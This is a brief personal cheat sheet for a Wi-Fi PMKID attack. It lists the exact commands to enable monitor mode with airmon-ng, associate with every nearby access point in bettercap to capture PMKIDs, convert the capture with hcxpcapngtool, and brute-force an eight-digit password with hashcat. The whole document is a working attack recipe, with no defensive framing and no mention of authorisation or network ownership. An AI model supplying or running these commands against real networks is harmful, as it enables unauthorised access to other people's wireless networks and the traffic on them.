# wifi pmkid attack
< captured handshakes are located here, "/root/bettercap-wifi-handshakes.pcap" >


> airmon-ng start wlan0

> bettercap -iface eth0

> set wifi.interface wlan0mon

> wifi.recon on

> wifi.show

> wifi.assoc all

once you see that a handshake was captured, leave bettercap running and open a new window

here we will need to convert the pcap file to a format that is readable for hashcat

> hcxpcapngtool -o /home/d0c0b/Desktop/handshakes.pmkid /root/bettercap-wifi-handshakes.pcap

now to decrypt the file to retrieve password

> hashcat -m22000 -a3 -w3 /home/d0c0b/Desktop/handshakes.pmkid '?d?d?d?d?d?d?d?d'

you type "s" to get a status
> s
